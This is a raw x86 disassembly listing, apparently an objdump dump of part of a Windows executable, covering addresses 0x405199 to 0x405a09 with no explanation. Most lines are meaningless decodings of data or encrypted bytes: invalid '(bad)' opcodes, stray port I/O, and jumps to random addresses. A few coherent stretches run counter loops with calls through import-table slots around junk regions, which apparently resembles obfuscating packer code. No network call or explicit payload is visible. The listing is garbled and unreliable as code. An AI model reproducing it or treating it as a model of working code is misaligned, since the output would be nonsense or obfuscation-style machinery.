  405199:	jmp    0xf9e9:0xbbe8c0ed
  4051a0:	or     eax,0x83ec2f38
  4051a5:	xlat   BYTE PTR ds:[ebx]
  4051a6:	inc    ebp
  4051a7:	sub    al,BYTE PTR [edi]
  4051a9:	jb     0x40520e
  4051ab:	imul   esi,DWORD PTR [ebx+0x2f945a6f],0x489c0dd4
  4051b5:	mov    dl,0xa
  4051b7:	icebp  
  4051b8:	inc    edi
  4051b9:	mov    WORD PTR [ebp+esi*1+0x12],ds
  4051bd:	les    ebx,FWORD PTR [ecx+0x4196a02]
  4051c3:	add    eax,0x9866169a
  4051c8:	cmp    al,0x5e
  4051ca:	ret    
  4051cb:	cmp    ecx,DWORD PTR [ebx-0x59]
  4051ce:	dec    ecx
  4051cf:	jecxz  0x405239
  4051d1:	stos   BYTE PTR es:[edi],al
  4051d2:	dec    ecx
  4051d3:	out    dx,eax
  4051d4:	xchg   edi,eax
  4051d5:	push   cs
  4051d6:	(bad)  
  4051d7:	adc    al,0x3b
  4051d9:	in     eax,dx
  4051da:	out    0x59,al
  4051dc:	out    0xc0,eax
  4051de:	enter  0x54c3,0x20
  4051e2:	mov    al,0x6
  4051e4:	cdq    
  4051e5:	repnz inc esp
  4051e7:	cdq    
  4051e8:	mov    eax,0x537fcfc3
  4051ed:	and    dl,BYTE PTR [edx]
  4051ef:	enter  0x6588,0x60
  4051f3:	call   0xddb6cfc4
  4051f8:	jns    0x4051e5
  4051fa:	int    0xca
  4051fc:	xchg   edi,eax
  4051fd:	lahf   
  4051fe:	int    0x7
  405200:	lock jp 0x4051ec
  405203:	pop    edi
  405204:	mov    dl,ch
  405206:	les    ebp,FWORD PTR [edx-0x454ac749]
  40520c:	lods   eax,DWORD PTR ds:[esi]
  40520d:	in     eax,0x77
  40520f:	jmp    0x7e1f9419
  405214:	sub    DWORD PTR [ebp+0x123259a3],edx
  40521a:	jne    0x40528d
  40521c:	test   eax,0x99862d6b
  405221:	or     ebx,DWORD PTR [ebp+0x340aeac9]
  405227:	push   ss
  405228:	fist   WORD PTR [esi+ebx*1-0x37]
  40522c:	xchg   esp,eax
  40522d:	outs   dx,DWORD PTR ds:[esi]
  40522e:	aam    0x6f
  405230:	sbb    eax,0xbdb215df
  405235:	or     ecx,DWORD PTR [ebx+eiz*2]
  405238:	and    BYTE PTR [ebp-0x66],cl
  40523b:	bound  edi,QWORD PTR gs:[ebx+0x2b1875da]
  405242:	mov    edi,esi
  405244:	mov    ds:0xce043b9e,al
  405249:	push   0xffffffa1
  40524b:	sbb    al,0xd
  40524d:	addr16 jae 0x405273
  405250:	mov    eax,DWORD PTR [edi+0x1428bdf]
  405256:	call   0x314d:0xb6cef5b6
  40525d:	lods   al,BYTE PTR ds:[esi]
  40525e:	fwait
  40525f:	jge    0x4052da
  405261:	mov    BYTE PTR [ebx+0x376d6195],dh
  405267:	push   0xdacb4062
  40526c:	sbb    esi,DWORD PTR [esi*2+0x3b397c89]
  405273:	jnp    0x4051fc
  405275:	aaa    
  405276:	dec    edx
  405277:	push   eax
  405278:	je     0x4052ee
  40527a:	pop    ecx
  40527b:	ror    dh,0x6a
  40527e:	pop    ss
  40527f:	mov    esp,0x34053910
  405284:	fst    QWORD PTR [ecx+0x3b3705df]
  40528a:	pusha  
  40528b:	mov    ch,0xb9
  40528d:	pushf  
  40528e:	in     eax,dx
  40528f:	test   al,0x51
  405291:	frstor [esp+esi*2+0x51]
  405295:	mov    esp,0xff6ba9cb
  40529a:	gs cmp al,0x68
  40529d:	sbb    eax,0x6a40a806
  4052a2:	jmp    0x405248
  4052a4:	mov    ds:0xaad888fd,al
  4052a9:	jae    0x405271
  4052ab:	out    0x81,eax
  4052ad:	cmp    al,0x5c
  4052af:	cmp    esp,esi
  4052b1:	arpl   WORD PTR [ebp-0x5],ax
  4052b4:	mov    dh,0x94
  4052b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052b7:	mov    DWORD PTR ds:0xec0746b1,esp
  4052bd:	in     al,dx
  4052be:	or     eax,0x13243dd6
  4052c3:	sbb    DWORD PTR [ebx-0x31],edx
  4052c6:	fsubp  st(7),st
  4052c8:	jbe    0x40532f
  4052ca:	(bad)  
  4052cb:	test   ebx,edi
  4052cd:	test   BYTE PTR [esi],bl
  4052cf:	cmp    dl,dh
  4052d1:	adc    DWORD PTR [ebp-0x6c],ebx
  4052d4:	sahf   
  4052d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052d6:	mov    bh,0x76
  4052d8:	(bad)  
  4052d9:	mov    ebx,0x54f57bce
  4052de:	inc    edi
  4052df:	aam    0x61
  4052e1:	sub    ebx,DWORD PTR [ecx-0x1efdfadf]
  4052e7:	(bad)  
  4052e8:	sbb    cl,cl
  4052ea:	pop    es
  4052eb:	jbe    0x405342
  4052ed:	or     esi,DWORD PTR ds:0xbf1408e9
  4052f3:	shl    BYTE PTR [edx-0x61],0x5
  4052f7:	mov    ah,0xea
  4052f9:	sbb    BYTE PTR [esp+ecx*4-0x4a],dh
  4052fd:	nop
  4052fe:	cwde   
  4052ff:	outs   dx,BYTE PTR ds:[esi]
  405300:	cmp    ah,0x9f
  405303:	cmova  eax,ecx
  405306:	test   BYTE PTR ds:0x9238af6f,ch
  40530c:	push   es
  40530d:	shr    BYTE PTR [ebx+0x7f6c8882],0x11
  405314:	fistp  DWORD PTR [ebp+0x14cfd65f]
  40531a:	mov    eax,0x7fa94764
  40531f:	outs   dx,BYTE PTR ds:[esi]
  405320:	in     al,dx
  405321:	or     dh,al
  405323:	retf   
  405324:	inc    eax
  405325:	cli    
  405326:	gs aam 0xf9
  405329:	imul   ebp,DWORD PTR [eax],0x33
  40532c:	aad    0xc6
  40532e:	inc    esp
  40532f:	xor    BYTE PTR [edx-0x58],ah
  405332:	mov    bl,0x4a
  405334:	dec    eax
  405335:	ss shl edx,1
  405338:	ret    0x92a4
  40533b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40533c:	inc    esp
  40533d:	loop   0x405333
  40533f:	stc    
  405340:	iret   
  405341:	sub    BYTE PTR [ebp+0x6a],0x66
  405345:	mov    ah,0x42
  405347:	outs   dx,DWORD PTR ds:[esi]
  405348:	pop    ebp
  405349:	int3   
  40534a:	rol    BYTE PTR [eax],1
  40534c:	mov    ebp,0x84da2817
  405351:	rcr    BYTE PTR [ebx-0x2d],1
  405354:	xor    al,0xb
  405356:	in     eax,dx
  405357:	repz mov bl,0x80
  40535a:	add    edx,ebx
  40535c:	push   edx
  40535d:	leave  
  40535e:	cmc    
  40535f:	xchg   ebp,eax
  405360:	sub    al,0x2
  405362:	pop    eax
  405363:	jo     0x4053c5
  405365:	pop    esi
  405366:	jbe    0x40537a
  405368:	mov    cs,WORD PTR [edi]
  40536a:	fs addr16 mov ebx,0x18197cc3
  405371:	pop    es
  405372:	in     eax,0x92
  405374:	pop    edx
  405375:	sti    
  405376:	enter  0xfebb,0xa8
  40537a:	clc    
  40537b:	sahf   
  40537c:	push   ss
  40537d:	inc    ebx
  40537e:	cmp    al,0xa1
  405380:	loop   0x405394
  405382:	shrd   ecx,esp,0x5b
  405386:	xchg   ebp,eax
  405387:	cmc    
  405388:	pop    esi
  405389:	call   0x2ced931d
  40538e:	mov    dl,ch
  405390:	adc    DWORD PTR [ebx+edx*2+0x67aace67],0x7f
  405398:	cwde   
  405399:	pop    ss
  40539a:	xchg   edi,eax
  40539b:	add    ebp,DWORD PTR [edi+0x7c]
  40539e:	fnsetpm(287 only) 
  4053a0:	and    DWORD PTR [esi-0x26],ebp
  4053a3:	xor    DWORD PTR [ebx],eax
  4053a5:	lods   eax,DWORD PTR ds:[esi]
  4053a6:	rcr    DWORD PTR [ebp-0x5c],1
  4053a9:	push   0x5134f557
  4053ae:	inc    esp
  4053af:	inc    ecx
  4053b0:	test   DWORD PTR [eax-0x6c8408f6],esi
  4053b6:	jno    0x405398
  4053b8:	xchg   esp,eax
  4053b9:	sbb    dl,BYTE PTR [esi+0x2a]
  4053bc:	shl    ecx,cl
  4053be:	ror    DWORD PTR [ebp+0x1d5e752f],0x4b
  4053c5:	xor    bl,dl
  4053c7:	sub    DWORD PTR [esi+0x48aeff0c],ecx
  4053cd:	mov    WORD PTR [ebx+0x28466487],ds
  4053d3:	mov    cl,0x1d
  4053d5:	lock sub DWORD PTR [esi],ebx
  4053d8:	jmp    0x405439
  4053da:	(bad)  
  4053db:	mov    edi,0x2d5e83b4
  4053e0:	ins    DWORD PTR es:[edi],dx
  4053e1:	xor    edx,eax
  4053e3:	and    ch,BYTE PTR [edx+0x5f26510f]
  4053e9:	int    0xbd
  4053eb:	lea    esi,[ebp+0x73310db1]
  4053f1:	xchg   BYTE PTR [ebx],ch
  4053f3:	push   edi
  4053f4:	push   0x91b14956
  4053f9:	sbb    eax,0xa30ff0cb
  4053fe:	icebp  
  4053ff:	jmp    0x75ed5187
  405404:	fs js  0x40546a
  405407:	test   BYTE PTR [esi-0x67fa4e2e],0xd5
  40540e:	dec    bp
  405410:	mov    edx,0x3c7d3ff8
  405415:	scas   eax,DWORD PTR es:[edi]
  405416:	and    DWORD PTR [esp+edx*1+0x394409d3],edi
  40541d:	add    eax,0x58e7e5e8
  405422:	pop    edx
  405423:	in     al,dx
  405424:	mov    edx,edx
  405426:	repnz aas 
  405428:	push   esi
  405429:	aad    0x8d
  40542b:	pop    ss
  40542c:	mov    esi,eax
  40542e:	pop    es
  40542f:	fmul   DWORD PTR [esi-0x6]
  405432:	mov    eax,0x9f31d594
  405437:	xor    eax,0x93c6fc49
  40543c:	jns    0x4053f7
  40543e:	jmp    0xd72ab7ed
  405443:	(bad)  
  405444:	cwde   
  405445:	push   edx
  405446:	push   eax
  405447:	mov    ah,0xb
  405449:	fisub  DWORD PTR fs:[eax+0x44cc46c0]
  405450:	and    BYTE PTR [edi],0x36
  405453:	lock push esi
  405455:	push   edx
  405456:	adc    ch,BYTE PTR [ebp+0x2f]
  405459:	fld    TBYTE PTR [eax+0x7c7a7dae]
  40545f:	add    ah,BYTE PTR [ebp-0x58]
  405462:	push   esp
  405463:	call   0x265be703
  405468:	mov    edi,DWORD PTR [esi]
  40546a:	jecxz  0x405492
  40546c:	stos   DWORD PTR es:[edi],eax
  40546d:	sub    al,0xad
  40546f:	cmc    
  405470:	push   ebx
  405471:	and    esp,DWORD PTR [ebx-0x7733dfc6]
  405477:	shl    DWORD PTR [ecx],cl
  405479:	push   ebp
  40547a:	jmp    0x40549b
  40547c:	xor    eax,0x15c836ac
  405481:	mov    esp,0x344dd2f1
  405486:	xor    esp,esi
  405488:	aad    0x6d
  40548a:	setl   BYTE PTR [ebp-0x5768e4bd]
  405491:	inc    edi
  405492:	(bad)  
  405493:	out    dx,al
  405494:	xor    DWORD PTR [ebx-0xef532d5],ecx
  40549a:	jg     0x4054e2
  40549c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40549d:	shl    eax,cl
  40549f:	imul   DWORD PTR [esi+0x6f]
  4054a2:	mov    es,ecx
  4054a4:	jmp    0x40546f
  4054a6:	popa   
  4054a7:	dec    edi
  4054a8:	aad    0x45
  4054aa:	xor    DWORD PTR [ecx+0x6d],ebx
  4054ad:	cmp    bl,BYTE PTR [eax+edx*4-0x20634944]
  4054b4:	inc    ebx
  4054b5:	test   DWORD PTR [esi],edi
  4054b7:	in     eax,dx
  4054b8:	sub    al,0xa9
  4054ba:	adc    BYTE PTR [ecx-0x51],ch
  4054bd:	xor    BYTE PTR [edi],0x8e
  4054c0:	add    eax,DWORD PTR [edi]
  4054c2:	add    al,0x68
  4054c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054c5:	pop    esi
  4054c6:	push   cs
  4054c7:	outs   dx,DWORD PTR ds:[esi]
  4054c8:	jecxz  0x4054e9
  4054ca:	mov    ecx,DWORD PTR [esi]
  4054cc:	inc    ebp
  4054cd:	add    edx,ecx
  4054cf:	jmp    0x4063ea
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x4337e7
  4054e3:	or     DWORD PTR ds:0x433803,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x4337f3,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x4337f3
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x4337f3,ebx
  405504:	cmp    DWORD PTR ds:0x4337f3,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x4337f3,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x4337f3
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x4337f3,ebx
  405545:	cmp    DWORD PTR ds:0x4337f3,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x4337f7,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x4337b7,0x0
  405570:	mov    ebx,DWORD PTR ds:0x4337b7
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x4337b7,ebx
  40557d:	cmp    DWORD PTR ds:0x4337b7,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x433946
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x4337b7,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0xe464ef3b
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x4055fc
  40563a:	adc    esp,esi
  40563c:	cdq    
  40563d:	push   ecx
  40563f:	mov    BYTE PTR [ecx+0x33a157e3],dh
  405645:	les    ecx,FWORD PTR [edx-0x21]
  405648:	and    DWORD PTR [esi-0x1b],esp
  40564b:	mov    dl,0x8d
  40564d:	pop    esp
  40564e:	lods   eax,DWORD PTR ds:[esi]
  40564f:	and    eax,0x67395345
  405654:	sub    eax,DWORD PTR [ebp-0x17]
  405657:	sbb    eax,0x1a1a2bc7
  40565c:	sbb    BYTE PTR [edi+ebp*2+0x1c6e8feb],ch
  405663:	ins    BYTE PTR es:[edi],dx
  405664:	out    0xeb,al
  405666:	mov    ?,WORD PTR [edx]
  405668:	jp     0x40568c
  40566a:	add    eax,0x4899b99d
  40566f:	jmp    0x4bf0b045
  405674:	inc    esi
  405675:	mov    bh,0x9b
  405677:	push   eax
  405678:	jb     0x405674
  40567a:	sbb    esi,DWORD PTR [ecx-0x1569e982]
  405680:	lods   eax,DWORD PTR ds:[esi]
  405681:	pop    edx
  405682:	push   esp
  405683:	retf   0xe566
  405686:	mov    al,0x3d
  405688:	loope  0x40567b
  40568a:	mul    DWORD PTR [eax]
  40568c:	adc    eax,ebp
  40568e:	repz push ebp
  405690:	call   0x409eb72b
  405695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405696:	mov    bl,0xbd
  405698:	test   dh,0xf4
  40569b:	enter  0x9a18,0xbf
  40569f:	ja     0x4056b7
  4056a1:	sbb    dh,BYTE PTR [esp+ebx*1+0x7bc16efb]
  4056a8:	aas    
  4056a9:	and    al,0xf1
  4056ab:	adc    esp,ebx
  4056ad:	icebp  
  4056ae:	sub    ebx,DWORD PTR [edx-0x3b]
  4056b1:	enter  0x7255,0x87
  4056b5:	test   al,0x9d
  4056b7:	(bad)  
  4056b8:	sbb    eax,edi
  4056ba:	xor    eax,0x4efcf148
  4056bf:	cwde   
  4056c0:	stos   BYTE PTR es:[edi],al
  4056c1:	xor    bl,0xe
  4056c4:	jecxz  0x4056d9
  4056c6:	push   ecx
  4056c7:	scas   eax,DWORD PTR es:[edi]
  4056c8:	and    DWORD PTR [ecx],0x981157e8
  4056ce:	xchg   DWORD PTR [ebx+0x154718c9],edx
  4056d4:	ins    DWORD PTR es:[edi],dx
  4056d5:	bound  eax,QWORD PTR [ecx+0x1]
  4056d8:	sub    al,0xc1
  4056da:	cld    
  4056db:	sub    al,bh
  4056dd:	out    0x60,eax
  4056df:	cli    
  4056e0:	fldenv [ebx+edx*2-0x6e533bdd]
  4056e7:	enter  0x2cf8,0x2c
  4056eb:	jns    0x40572a
  4056ed:	sti    
  4056ee:	add    al,0xed
  4056f0:	sub    DWORD PTR [eax],eax
  4056f2:	inc    edx
  4056f3:	jmp    0x2dfb333
  4056f8:	test   DWORD PTR [edx],edx
  4056fa:	cmp    BYTE PTR ds:0x813ff94b,al
  405700:	dec    ebp
  405701:	rol    ebp,cl
  405703:	jno    0x405687
  405705:	sbb    bl,BYTE PTR [edi+0x6]
  405708:	ret    0x8be2
  40570b:	fistp  QWORD PTR [ebp-0x53]
  40570e:	in     al,dx
  40570f:	jns    0x4056c6
  405711:	mov    esi,0x113b417b
  405716:	cmc    
  405717:	mov    ebp,0x56222cb9
  40571c:	lock xchg ebx,eax
  40571e:	dec    DWORD PTR [eax]
  405720:	xchg   edx,eax
  405721:	pusha  
  405722:	mov    ecx,0x51412556
  405727:	stc    
  405728:	enter  0x3eeb,0xb5
  40572c:	gs enter 0x3ae5,0x7b
  405731:	sbb    BYTE PTR [ebx+0x6c],bh
  405734:	cs lahf 
  405736:	fdivrp st(5),st
  405738:	leave  
  405739:	add    BYTE PTR [edx+0x75],bl
  40573c:	push   esp
  40573d:	and    eax,0xef23d7b5
  405742:	mov    al,ds:0x6f2738c
  405747:	xchg   edx,eax
  405748:	std    
  405749:	jnp    0x4057a8
  40574b:	outs   dx,BYTE PTR ds:[esi]
  40574c:	jno    0x4057a1
  40574e:	fstp   TBYTE PTR [edi-0x24c3de11]
  405754:	mov    ds:0x19ab2bae,al
  405759:	(bad)  
  40575a:	lock mov dh,0x42
  40575d:	test   bh,ch
  40575f:	sub    eax,0x46fda3de
  405764:	mov    dl,0x11
  405766:	leave  
  405767:	jae    0x40579c
  405769:	popf   
  40576a:	adc    ah,BYTE PTR [eax+ecx*4-0x26952bde]
  405771:	mov    dl,0x8c
  405773:	jbe    0x4056fd
  405775:	lahf   
  405776:	ins    BYTE PTR es:[edi],dx
  405777:	test   DWORD PTR [eax+edx*2],0xc1d22bc8
  40577e:	in     eax,0x5d
  405780:	add    al,BYTE PTR [esi+edx*4+0x6296db29]
  405787:	xchg   ebp,eax
  405788:	fwait
  405789:	xchg   DWORD PTR [ebp+ebp*1+0x46801b26],eax
  405790:	and    ebx,DWORD PTR [eax+eiz*2-0x226b226e]
  405797:	std    
  405798:	or     al,0x5a
  40579a:	aaa    
  40579b:	call   0x923a:0xea96194b
  4057a2:	mov    al,0xb0
  4057a4:	lahf   
  4057a5:	jo     0x4057a8
  4057a7:	mov    ds,WORD PTR [esi+eiz*4]
  4057aa:	dec    DWORD PTR [edx+0x5d390bc9]
  4057b0:	inc    edi
  4057b1:	(bad)  
  4057b2:	pop    ds
  4057b3:	hlt    
  4057b4:	lock mov dh,ch
  4057b7:	fadd   st,st(5)
  4057b9:	sbb    al,0x72
  4057bb:	enter  0xb955,0xf8
  4057bf:	mov    eax,ds:0xbef49b3d
  4057c4:	cs loopne 0x405841
  4057c7:	lock sbb al,0x2c
  4057ca:	repnz out dx,al
  4057cc:	arpl   WORD PTR [edi],dx
  4057ce:	pop    esp
  4057cf:	call   0xa6b:0x6bb5419b
  4057d6:	cmp    eax,0xd86c99a8
  4057db:	in     al,0xf
  4057dd:	lods   al,BYTE PTR ds:[esi]
  4057de:	fbstp  TBYTE PTR [esi-0xd]
  4057e1:	out    0x72,al
  4057e3:	fild   DWORD PTR [eax]
  4057e5:	test   al,0xa5
  4057e7:	pop    eax
  4057e8:	mov    esi,0x70b9bf42
  4057ed:	imul   ebx,DWORD PTR [ebx+0x323a9cf4],0xfffffff0
  4057f4:	dec    edi
  4057f5:	adc    eax,0x3326d8d3
  4057fa:	push   eax
  4057fb:	in     al,0xe9
  4057fd:	lods   eax,DWORD PTR ds:[esi]
  4057fe:	dec    eax
  4057ff:	mov    eax,ds:0x87b75a78
  405804:	(bad)  
  405805:	cwde   
  405806:	xchg   DWORD PTR [ecx],edi
  405808:	stos   DWORD PTR es:[edi],eax
  405809:	nop
  40580a:	dec    ecx
  40580b:	push   es
  40580c:	es dec esp
  40580e:	and    eax,DWORD PTR [esi+0x68]
  405811:	rcl    eax,1
  405813:	mov    al,ds:0xca29b31d
  405818:	mov    ecx,0x6b08b122
  40581d:	xchg   edi,eax
  40581e:	int3   
  40581f:	icebp  
  405820:	int    0x8d
  405822:	jns    0x4057eb
  405824:	xchg   esi,eax
  405825:	mov    eax,ds:0x3b8b081f
  40582a:	dec    ebp
  40582b:	jg     0x4057f3
  40582d:	sub    bh,BYTE PTR [ecx]
  40582f:	sbb    ebp,DWORD PTR [eax]
  405831:	sbb    dh,BYTE PTR [edx+0x4c]
  405834:	popa   
  405835:	sub    ch,BYTE PTR [edx-0x31]
  405838:	repnz and al,0xf3
  40583b:	ret    
  40583c:	mov    bh,0x1d
  40583e:	aad    0xcf
  405840:	fld    QWORD PTR [ecx]
  405842:	add    al,BYTE PTR [eax+0x2b23db5d]
  405848:	jmp    0x51bf:0x57912a0d
  40584f:	(bad)  
  405851:	xchg   ebp,eax
  405852:	repz pushf 
  405854:	mov    cl,0x9c
  405857:	add    eax,0x10c0f357
  40585c:	fiadd  DWORD PTR [ecx]
  40585e:	and    al,0x2
  405860:	imul   edi,DWORD PTR ss:[eax],0x49381
  405867:	fldcw  WORD PTR [eax]
  405869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40586a:	stc    
  40586b:	or     DWORD PTR [edi],eax
  40586d:	xchg   DWORD PTR [ecx],ebp
  40586f:	clc    
  405870:	sbb    ecx,esp
  405872:	mov    ds:0x7e907759,al
  405877:	or     ah,BYTE PTR gs:[ebx-0x211a6b1c]
  40587e:	gs bnd je 0x405849
  405882:	cmp    esp,DWORD PTR [eax]
  405884:	jg     0x405890
  405886:	or     DWORD PTR [edx-0xc395cec],edx
  40588c:	imul   edx,DWORD PTR [edx+0x7cb018a5],0x55968e6
  405896:	mov    ecx,0xb6d5a004
  40589b:	sub    ch,BYTE PTR [ebx-0x52]
  40589e:	cmp    eax,0x18419ad0
  4058a3:	dec    esp
  4058a4:	jecxz  0x405847
  4058a6:	mov    dl,0x47
  4058a8:	xor    eax,0x41e9add
  4058ad:	shl    DWORD PTR [edx+ebx*8],0xd5
  4058b1:	imul   esp,DWORD PTR [ecx],0x19
  4058b4:	xor    DWORD PTR [esi],ecx
  4058b6:	or     BYTE PTR [ebx+0x358591cb],0xb8
  4058bd:	inc    ecx
  4058be:	cs inc esi
  4058c0:	out    dx,eax
  4058c1:	dec    edx
  4058c2:	adc    eax,0xcaeae75c
  4058c7:	aas    
  4058c8:	inc    ebp
  4058c9:	push   edx
  4058ca:	(bad)  
  4058cb:	fst    QWORD PTR [esi+edi*4-0x39]
  4058cf:	mov    dl,0x96
  4058d1:	test   DWORD PTR [esp+edi*1-0x74],esi
  4058d5:	mov    BYTE PTR [edx+0x4b],bl
  4058d8:	cwde   
  4058d9:	sbb    cl,BYTE PTR [ecx]
  4058db:	out    dx,eax
  4058dc:	sbb    ah,ch
  4058de:	and    ch,BYTE PTR [eax-0x4b2d9b26]
  4058e4:	int3   
  4058e5:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4058e7:	repz push eax
  4058e9:	mov    al,0x77
  4058eb:	push   es
  4058ec:	sbb    BYTE PTR [esi],0x5a
  4058ef:	mov    al,0xab
  4058f1:	mov    ds:0x6b759b77,eax
  4058f6:	stos   BYTE PTR es:[edi],al
  4058f7:	jp     0x405910
  4058f9:	xchg   esp,eax
  4058fa:	aad    0x47
  4058fc:	iret   
  4058fd:	aad    0xba
  4058ff:	sar    BYTE PTR [edi],cl
  405901:	mov    ecx,0xf53b09d6
  405906:	frstor [edi+0x1e0c4edb]
  40590c:	mov    ds:0x66e831be,al
  405911:	pushf  
  405912:	inc    esp
  405913:	or     eax,0xc8aa419a
  405918:	(bad)  
  405919:	(bad)  
  40591a:	(bad)  
  40591b:	xchg   ebx,eax
  40591c:	cmp    dh,BYTE PTR [edx+0x11]
  40591f:	jge    0x405919
  405921:	mov    cl,0x95
  405923:	adc    eax,DWORD PTR [edx-0x2b]
  405926:	sar    BYTE PTR [edx+0x16],cl
  405929:	sub    al,0xfd
  40592b:	pushf  
  40592c:	and    DWORD PTR [ebx+0x7e],0x8d28e124
  405933:	xchg   esi,eax
  405934:	out    0xd0,al
  405936:	data16 add BYTE PTR [ecx-0x563d65d],dl
  40593d:	push   ss
  40593e:	pop    ecx
  40593f:	test   eax,0x5f99621e
  405944:	(bad)  
  405945:	clc    
  405946:	push   cs
  405947:	loope  0x4058e8
  405949:	loop   0x405951
  40594b:	sbb    al,0x6f
  40594d:	cmp    eax,esi
  40594f:	inc    esi
  405950:	adc    eax,0xfbb28502
  405955:	or     edx,esi
  405957:	mov    ebx,0x91447657
  40595c:	push   0x92eea702
  405961:	retf   0xc329
  405964:	and    al,0x33
  405966:	cmp    ch,BYTE PTR [edi+0x58]
  405969:	jmp    0xe3283cbb
  40596e:	das    
  40596f:	inc    edi
  405970:	mov    DWORD PTR [ecx],esp
  405972:	shl    BYTE PTR [eax],cl
  405974:	mov    al,0x60
  405976:	mov    edx,DWORD PTR [ebp-0x30]
  405979:	jmp    0x4063dc
  40597e:	mov    edx,DWORD PTR [ebp-0x38]
  405981:	mov    edi,DWORD PTR [ebp-0x4]
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	adc    eax,DWORD PTR [edi-0x28]
  4059b3:	call   0x7d33:0x7e7e326a
  4059ba:	jle    0x405a3a
  4059bc:	ffree  st(5)
  4059be:	retf   
  4059bf:	cmp    esi,edi
  4059c1:	(bad)  
  4059c2:	push   eax
  4059c3:	inc    esp
  4059c4:	std    
  4059c5:	pop    esp
  4059c6:	cmp    bl,0xb6
  4059c9:	hlt    
  4059ca:	mov    eax,ss:0x1502780
  4059d0:	pusha  
  4059d1:	loop   0x405995
  4059d3:	std    
  4059d4:	cs scas eax,DWORD PTR es:[edi]
  4059d6:	mov    esi,0x1b66638d
  4059db:	add    DWORD PTR [edi],ebx
  4059dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059de:	rcl    DWORD PTR [edi+0x0],1
  4059e1:	push   ecx
  4059e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059e4:	cmp    edx,DWORD PTR [edi+0x44]
  4059e7:	popf   
  4059e8:	cs gs das 
  4059eb:	test   al,0xf7
  4059ed:	dec    ebp
  4059ee:	repz fistp WORD PTR [edx]
  4059f1:	shr    DWORD PTR [ecx],cl
  4059f3:	retf   0x6560
  4059f6:	fs sub al,0x50
  4059f9:	and    BYTE PTR [ecx-0x14b89bce],dl
  4059ff:	dec    edi
  405a00:	xchg   esi,eax
  405a01:	les    esp,FWORD PTR [edi-0x35]
  405a04:	adc    eax,0xa135e97d
  405a09:	retf   0x1587
